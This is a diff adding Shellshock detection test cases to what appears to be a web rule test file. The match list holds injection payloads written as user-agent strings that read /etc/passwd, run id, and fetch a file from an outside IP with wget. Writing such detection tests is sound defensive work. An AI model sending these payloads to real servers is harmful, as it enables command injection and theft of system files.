@@ -508,3 +508,22 @@ no_match = [
   "/gpon-review",
   "/products/boaform-guide.html",
 ]
+
+# Cases of a rule that reads the user agent (or referer) are values of that field, not targets.
+[cmdi-shellshock]
+match = [
+  "() { :;}; /bin/bash -c 'cat /etc/passwd'",
+  "() { _; } >_[$($())] { echo vulnerable; }; id",
+  "() {:;}; wget http://203.0.113.9/x",
+  "(){ :;}; /bin/id",
+  "Mozilla/5.0 () { test;};echo",
+]
+no_match = [
+  "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120",
+  "my-app (build {17}); linux",
+  "() ",
+  "{ :;};",
+  "curl/8.0",
+  "my-app () {build} v2",
+  "Mozilla/5.0 () {x} compatible",
+]
